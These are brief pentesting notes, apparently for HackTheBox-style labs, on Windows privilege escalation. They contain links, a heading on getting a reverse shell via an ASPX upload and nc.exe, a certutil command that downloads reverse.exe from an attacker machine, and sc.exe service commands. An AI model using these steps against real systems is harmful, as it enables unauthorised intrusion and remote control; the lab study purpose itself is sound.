# Privilege escalation

https://guif.re/windowseop#Windows%20version%20map

# ASPX File upload -> Download nc.exe and take reverse shell

https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c


## Powershell script to download exe from the kali machine (From Cmd)

https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/


## Download files from kali machine using certutil

certutil.exe -urlcache -split -f http://10.10.14.33:8888/reverse.exe reverse.exe

## Windows service commands

Query the configuration of a service

```
> sc.exe qc <name>
```

Query the current status of a service

```
> sc.exe query <name>
```

Modify configuraton  option of a service

```
> sc.exe config <name> <option>= <value>
```

Start/Stop a service

```
> net start/stop <name>
```

```
